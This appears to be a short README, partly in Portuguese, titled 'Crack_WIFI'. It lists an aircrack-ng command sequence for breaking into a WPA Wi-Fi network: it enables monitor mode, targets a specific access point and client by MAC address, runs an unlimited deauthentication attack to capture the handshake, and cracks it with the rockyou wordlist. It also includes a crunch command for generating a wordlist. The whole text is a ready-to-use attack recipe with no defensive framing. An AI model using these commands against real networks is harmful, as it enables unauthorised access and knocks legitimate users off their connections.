# Crack_WIFI
Crack_WIFI <br>
 <br>
airmon-ng check wlan0  <br>
airmon-ng check kill  <br>
airmon-ng start wlan0  <br>
airodump-ng wlan0 -a --band abg  <br>
airodump-ng -c 11 -d E4:C0:E2:1C:6E:6B -a --band abg wlan0  <br>
airodump-ng -c 11 -d E4:C0:E2:1C:6E:6B -a --band abg -w captura wlan0  <br>
aireplay-ng --deauth 0 -a E4:C0:E2:1C:6E:6B -c 28:87:BA:3A:AF:CF wlan0  <br>
<b> DEVE APARECER NO CAMPO NOTES EAPOL, PARA PODER PARAR A COLETA  </b> <br>
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b E4:C0:E2:1C:6E:6B captura.cap  <br>
<br>
Para gerar a wordlist pode ser usado o: <br>
crunch 8 10 -f /usr/share/crunch/charset.lst mixalpha -o wordlist.txt <br>
<br>
Parâmetro PWR é o sinal WIFI. Quando mais perto de 0, melhor sinal.  <br>
